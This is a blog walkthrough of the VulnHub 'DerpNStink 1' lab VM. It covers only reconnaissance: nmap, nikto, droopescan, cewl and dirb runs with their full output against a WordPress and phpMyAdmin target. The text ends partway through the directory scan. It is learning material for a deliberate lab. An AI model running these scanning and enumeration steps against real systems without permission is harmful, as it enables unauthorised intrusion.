<html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
        <title>/f0c1s/blog/sec/vulnhub/derpNstink-1</title>
        <link rel="stylesheet" href="../../../index.css"/>
        <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
        <script src="../../../highlight/highlight.min.js"></script>
        <script src="../../../setup.js"></script>
        <script>hljs.highlightAll();</script>
    </head>
<body onload="setup()">
<h1>/f0c1s/blog/sec/vulnhub/derpNstink-1</h1>

<p>
    <a href="../../../index.html">/blog</a>
    <a href="../../index.html">Security</a>
    <a href="../index.html">VulnHub</a>
    <a href="../../../sec/vulnhub/derpNstink-1/derpNstink-1.html">+ derpNstink 1 - 2021.12.27 Monday</a>
</p>

## Description

> Difficulty: Beginner
>
> Description:
>
> Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...
>
> Instructions:
>
> This is a boot2root Ubuntu based virtual machine. It was tested on VMware Fusion and VMware Workstation12 using DHCP settings for its network interface. It was designed to model some of the earlier machines I encountered during my OSCP labs also with a few minor curve-balls but nothing too fancy. Stick to your classic hacking methodology and enumerate all the things!
>
> Your goal is to remotely attack the VM and find all 4 flags eventually leading you to full root access. Don't forget to #tryharder
>
> Example: flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier.

> Contact
>
> Hit me up if you enjoy this VM! Twitter: @securekomodo Email: hackerbryan@protonmail.com
>

[VulnHub](https://www.vulnhub.com/entry/derpnstink-1,221/)

![0.running-box](0.running-box.png)

## Scanning


```shell
hostname -I: 192.168.56.70 
Monday 27 December 2021 04:03:58 AM IST 2021.12.27 04:03:58
f0c1s@kali:~/vuln-hubs/derpNstink/1 $
fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.83
                                                                                                                                                                                                                                           
```

```shell
hostname -I: 192.168.56.70 
Monday 27 December 2021 04:04:11 AM IST 2021.12.27 04:04:11
f0c1s@kali:~/vuln-hubs/derpNstink/1 $
export RHOST="192.168.56.83"        
export LHOST="192.168.56.70"
export LPORT="443"
                                                                                                                                                                                                                                           
```

```shell
hostname -I: 192.168.56.70 
Monday 27 December 2021 04:04:24 AM IST 2021.12.27 04:04:24
f0c1s@kali:~/vuln-hubs/derpNstink/1 $
_n $RHOST  
firing nmap 192.168.56.83 | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 04:04 IST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.83
Host is up (0.00030s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
                                                                                                                                                                                                                                           
```

```shell
hostname -I: 192.168.56.70 
Monday 27 December 2021 04:04:28 AM IST 2021.12.27 04:04:28
f0c1s@kali:~/vuln-hubs/derpNstink/1 $
_ntd $RHOST
firing nmap 192.168.56.83 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 04:04 IST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.83
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: DeRPnStiNK
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
                                                                                                                                                                                                                                           
```

```shell
hostname -I: 192.168.56.70 
Monday 27 December 2021 04:04:40 AM IST 2021.12.27 04:04:40
f0c1s@kali:~/vuln-hubs/derpNstink/1 $
sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 04:04 IST
Nmap scan report for 192.168.56.83
Host is up (0.00079s latency).
Not shown: 93 open|filtered udp ports (no-response), 6 closed udp ports (port-unreach)
PORT     STATE SERVICE
5353/udp open  zeroconf
MAC Address: 08:00:27:4B:12:F3 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds
                                                                                                                                                                                                                                           
```

```shell
hostname -I: 192.168.56.70 
Monday 27 December 2021 04:04:47 AM IST 2021.12.27 04:04:47
f0c1s@kali:~/vuln-hubs/derpNstink/1 $
sudo nmap $RHOST -n -p21,22,80 -Pn -T4 --min-rate=5000 --top-ports=100 -sVC -A --script=*enum* | tee nmap.deep-enum.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 04:05 IST
Nmap scan report for 192.168.56.83
Host is up (0.00070s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh2-enum-algos: 
|   kex_algorithms: (8)
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group-exchange-sha1
|       diffie-hellman-group14-sha1
|       diffie-hellman-group1-sha1
|   server_host_key_algorithms: (4)
|       ssh-rsa
|       ssh-dss
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (16)
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       arcfour256
|       arcfour128
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|       chacha20-poly1305@openssh.com
|       aes128-cbc
|       3des-cbc
|       blowfish-cbc
|       cast128-cbc
|       aes192-cbc
|       aes256-cbc
|       arcfour
|       rijndael-cbc@lysator.liu.se
|   mac_algorithms: (19)
|       hmac-md5-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-ripemd160-etm@openssh.com
|       hmac-sha1-96-etm@openssh.com
|       hmac-md5-96-etm@openssh.com
|       hmac-md5
|       hmac-sha1
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-ripemd160
|       hmac-ripemd160@openssh.com
|       hmac-sha1-96
|       hmac-md5-96
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-enum: 
|   /robots.txt: Robots file
|_  /weblog/wp-login.php: Wordpress login page.
MAC Address: 08:00:27:4B:12:F3 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 192.168.56.83

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
                                                                                                                                                                                                                                           
```

There are three ports, 21 for FTP, 22 for SSH and 80 for web.

Software:

- vsftpd 3.0.2
- OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
- Apache httpd 2.4.7 ((Ubuntu))

Possible attack avenues:

- web
  - robots.txt
  - wordpress

## Attacking web

```shell
hostname -I: 192.168.56.70 
Monday 27 December 2021 04:07:30 AM IST 2021.12.27 04:07:30
f0c1s@kali:~/vuln-hubs/derpNstink/1 $
nikto -C all -host http://$RHOST | tee nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.83
+ Target Hostname:    192.168.56.83
+ Target Port:        80
+ Start Time:         2021-12-27 04:10:05 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/temporary/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 512, size: 55dcb6aaa2f50, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26524 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-12-27 04:11:27 (GMT5.5) (82 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                                                                                                                                                                                                                                           
```


```shell
curl -s http://$RHOST/robots.txt | html2text | tee curl.html2text.robots.txt
User-agent: * Disallow: /php/ Disallow: /temporary/
                                                                                                                                                                                                                                           
```

## Browsing web

![1.web-app](1.web-app.png)

### robots.txt

```
User-agent: *
Disallow: /php/
Disallow: /temporary/
```

### /php

![2.php-is-forbidden](2.php-is-forbidden.png)

### /temporary

![3.temporary-try-harder](3.temporary-try-harder.png)

### derp.png

![4.derp](4.derp.png)

### stinky.png

![5.stinky](5.stinky.png)

### a redirect

```shell
droopescan scan wordpress -u http://$RHOST/weblog -t 16
[+] Accepted redirect to http://derpnstink.local/weblog/
...
```

Gotta put it in the /etc/hosts

### droopescan

```shell
droopescan scan wordpress -u http://$RHOST/weblog -t 16
[+] Accepted redirect to http://derpnstink.local/weblog/
modules [ =                                                  ] 2/350 (0%)[+]  Got an HTTP 500 response.
modules [ =                                                  ] 3/350 (0%)[+]  Got an HTTP 500 response.
modules [ =                                                  ] 5/350 (1%)[+]  Got an HTTP 500 response.
[+] Plugins found:                                                              
    akismet http://derpnstink.local/weblog/wp-content/plugins/akismet/
        http://derpnstink.local/weblog/wp-content/plugins/akismet/readme.txt

[+] Themes found:
    twentysixteen http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
        http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
        http://derpnstink.local/weblog/wp-content/themes/twentysixteen/screenshot.png
    twentyfifteen http://derpnstink.local/weblog/wp-content/themes/twentyfifteen/
        http://derpnstink.local/weblog/wp-content/themes/twentyfifteen/readme.txt
        http://derpnstink.local/weblog/wp-content/themes/twentyfifteen/screenshot.png
    twentyfourteen http://derpnstink.local/weblog/wp-content/themes/twentyfourteen/
        http://derpnstink.local/weblog/wp-content/themes/twentyfourteen/readme.txt
        http://derpnstink.local/weblog/wp-content/themes/twentyfourteen/screenshot.png

[+] Possible version(s):
    4.6.2
    4.6.3
    4.7.1
    4.7.2
    4.7.3
    4.7.4
    4.7.5

[+] Possible interesting urls found:
    This CMS&#x27; default changelog. - http://derpnstink.local/weblog/readme.html

[+] Scan finished (0:00:07.654981 elapsed)
                                                                                                                   
```

### `http://derpnstink.local/weblog/`

![6.weblog](6.weblog.png)

```
Mr. Derp

Had moderate success marketing bagpipes in the aftermarket. 
Had moderate success training squirt guns for the government. 
At the moment I???m supervising the production of tinker toys for farmers. 
What gets me going now is implementing heroin in Salisbury, MD. 
In 2009 I was licensing mosquito repellent in Tampa, FL. 
Spent 2001-2007 donating shaving cream in Nigeria.

 

Uncle Stinky

Spent 2001-2007 working with wool in Ohio. 
Had a brief career testing the market for velcro in Minneapolis, MN. 
Have some experience consulting about race cars in the government sector. 
Earned praise for promoting toy monkeys in Naples, FL. 
Spoke at an international conference about selling race cars in Africa. 
Uniquely-equipped for working with toy planes on the black market.
```

### nikto again

```shell
nikto -C all -host http://derpnstink.local 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.83
+ Target Hostname:    derpnstink.local
+ Target Port:        80
+ Start Time:         2021-12-27 04:31:21 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/temporary/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 512, size: 55dcb6aaa2f50, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22
+ Uncommon header 'link' found, with multiple values: (<http://derpnstink.local/weblog/wp-json/>; rel="https://api.w.org/",<http://derpnstink.local/weblog/>; rel=shortlink,)
+ OSVDB-3092: /weblog/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26394 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2021-12-27 04:32:51 (GMT5.5) (90 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                                                                                                                   
```

### cewl for the login page on /weblog/wp-admin/

```shell
cewl http://derpnstink.local/weblog --with-numbers -d 4 -e >> cewl.txt
                                                                                                                   
```

### `http://derpnstink.local/php/phpmyadmin/`

![7.phpmyadmin](7.phpmyadmin.png)

### dirb

```shell
dirb http://derpnstink.local                           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec 27 04:46:13 2021
URL_BASE: http://derpnstink.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://derpnstink.local/ ----
==> DIRECTORY: http://derpnstink.local/css/                                                                       
+ http://derpnstink.local/index.html (CODE:200|SIZE:1298)                                                         
==> DIRECTORY: http://derpnstink.local/javascript/                                                                
==> DIRECTORY: http://derpnstink.local/js/                                                                        
==> DIRECTORY: http://derpnstink.local/php/                                                                       
+ http://derpnstink.local/robots.txt (CODE:200|SIZE:53)                                                           
+ http://derpnstink.local/server-status (CODE:403|SIZE:296)                                                       
==> DIRECTORY: http://derpnstink.local/temporary/                                                                 
==> DIRECTORY: http://derpnstink.local/weblog/                                                                    
                                                                                                                  
---- Entering directory: http://derpnstink.local/css/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/javascript/ ----
==> DIRECTORY: http://derpnstink.local/javascript/jquery/                                                         
                                                                                                                  
---- Entering directory: http://derpnstink.local/js/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/ ----
+ http://derpnstink.local/php/info.php (CODE:200|SIZE:0)                                                          
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/                                                            
                                                                                                                  
---- Entering directory: http://derpnstink.local/temporary/ ----
+ http://derpnstink.local/temporary/index.html (CODE:200|SIZE:12)                                                 
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/ ----
+ http://derpnstink.local/weblog/index.php (CODE:301|SIZE:0)                                                      
==> DIRECTORY: http://derpnstink.local/weblog/wp-admin/                                                           
==> DIRECTORY: http://derpnstink.local/weblog/wp-content/                                                         
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/                                                        
+ http://derpnstink.local/weblog/xmlrpc.php (CODE:405|SIZE:42)                                                    
                                                                                                                  
---- Entering directory: http://derpnstink.local/javascript/jquery/ ----
+ http://derpnstink.local/javascript/jquery/jquery (CODE:200|SIZE:252879)                                         
+ http://derpnstink.local/javascript/jquery/version (CODE:200|SIZE:5)                                             
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/ ----
+ http://derpnstink.local/php/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                        
+ http://derpnstink.local/php/phpmyadmin/index.php (CODE:200|SIZE:8269)                                           
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/js/                                                         
+ http://derpnstink.local/php/phpmyadmin/libraries (CODE:403|SIZE:307)                                            
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/                                                     
+ http://derpnstink.local/php/phpmyadmin/phpinfo.php (CODE:200|SIZE:8271)                                         
+ http://derpnstink.local/php/phpmyadmin/setup (CODE:401|SIZE:462)                                                
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/themes/                                                     
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-admin/ ----
+ http://derpnstink.local/weblog/wp-admin/admin.php (CODE:302|SIZE:0)                                             
==> DIRECTORY: http://derpnstink.local/weblog/wp-admin/css/                                                       
==> DIRECTORY: http://derpnstink.local/weblog/wp-admin/images/                                                    
==> DIRECTORY: http://derpnstink.local/weblog/wp-admin/includes/                                                  
+ http://derpnstink.local/weblog/wp-admin/index.php (CODE:302|SIZE:0)                                             
==> DIRECTORY: http://derpnstink.local/weblog/wp-admin/js/                                                        
==> DIRECTORY: http://derpnstink.local/weblog/wp-admin/maint/                                                     
==> DIRECTORY: http://derpnstink.local/weblog/wp-admin/network/                                                   
==> DIRECTORY: http://derpnstink.local/weblog/wp-admin/user/                                                      
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-content/ ----
+ http://derpnstink.local/weblog/wp-content/index.php (CODE:200|SIZE:0)                                           
==> DIRECTORY: http://derpnstink.local/weblog/wp-content/plugins/                                                 
==> DIRECTORY: http://derpnstink.local/weblog/wp-content/themes/                                                  
==> DIRECTORY: http://derpnstink.local/weblog/wp-content/upgrade/                                                 
==> DIRECTORY: http://derpnstink.local/weblog/wp-content/uploads/                                                 
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/ ----
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/certificates/                                           
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/css/                                                    
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/customize/                                              
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/fonts/                                                  
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/images/                                                 
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/                                                     
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/widgets/                                                
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/js/ ----
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/js/jquery/                                                  
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/ ----
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/ar/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/bg/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/ca/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/cs/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/da/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/de/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/el/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/es/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/et/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/fi/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/fr/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/gl/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/hi/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/hr/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/hu/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/id/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/it/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/ja/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/ko/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/lt/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/nl/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/pl/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/pt/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/pt_BR/                                               
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/ro/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/ru/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/si/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/sk/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/sl/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/sv/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/th/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/tr/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/uk/                                                  
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/zh_CN/                                               
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/locale/zh_TW/                                               
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/themes/ ----
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/themes/original/                                            
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-admin/css/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-admin/images/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-admin/includes/ ----
+ http://derpnstink.local/weblog/wp-admin/includes/admin.php (CODE:500|SIZE:0)                                    
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-admin/js/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-admin/maint/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-admin/network/ ----
+ http://derpnstink.local/weblog/wp-admin/network/admin.php (CODE:302|SIZE:0)                                     
+ http://derpnstink.local/weblog/wp-admin/network/index.php (CODE:302|SIZE:0)                                     
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-admin/user/ ----
+ http://derpnstink.local/weblog/wp-admin/user/admin.php (CODE:302|SIZE:0)                                        
+ http://derpnstink.local/weblog/wp-admin/user/index.php (CODE:302|SIZE:0)                                        
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-content/plugins/ ----
+ http://derpnstink.local/weblog/wp-content/plugins/index.php (CODE:200|SIZE:0)                                   
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-content/themes/ ----
+ http://derpnstink.local/weblog/wp-content/themes/index.php (CODE:200|SIZE:0)                                    
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-content/upgrade/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-content/uploads/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/certificates/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/css/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/customize/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/fonts/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/images/ ----
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/images/media/                                           
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/images/smilies/                                         
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/ ----
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/jquery/                                              
+ http://derpnstink.local/weblog/wp-includes/js/swfobject.js (CODE:200|SIZE:10231)                                
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/thickbox/                                            
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/                                             
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/widgets/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/js/jquery/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/ar/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/bg/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/ca/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/cs/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/da/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/de/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/el/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/es/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/et/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/fi/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/fr/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/gl/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/hi/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/hr/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/hu/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/id/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/it/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/ja/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/ko/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/lt/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/nl/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/pl/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/pt/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/pt_BR/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/ro/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/ru/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/si/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/sk/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/sl/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/sv/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/th/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/tr/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/uk/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/zh_CN/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/locale/zh_TW/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/themes/original/ ----
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/themes/original/css/                                        
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/themes/original/img/                                        
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/themes/original/jquery/                                     
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/images/media/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/images/smilies/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/jquery/ ----
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/jquery/ui/                                           
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/thickbox/ ----
                                                                                                                  
